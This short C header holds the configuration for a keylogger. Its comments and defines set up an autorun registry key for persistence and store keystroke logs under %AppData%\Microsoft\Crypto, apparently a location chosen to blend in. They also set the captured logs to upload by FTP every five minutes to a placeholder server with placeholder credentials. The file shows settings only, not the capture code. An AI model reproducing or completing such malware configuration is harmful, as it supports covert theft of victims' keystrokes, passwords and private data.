/* Keylogger name ( need for create autorun registry key ) */
#define NAME            L"foo"

/* Machine alias */
#define MACHINE         "bar"

/* Log file will be save in %AppData%\Microsoft\Crypto directory */
#define LOG_FILE        L"log.dat"

/* Send log to ftp every 5 min. 
 * Formula: ms * sec * min
 */
#define SEND_LOG_PERIOD  (1000 * 60 * 5)

/* FTP settings */
#define SERVER          "ftp.server.com"
#define PORT            21
#define USERNAME        "login"
#define PASSWORD        "password"

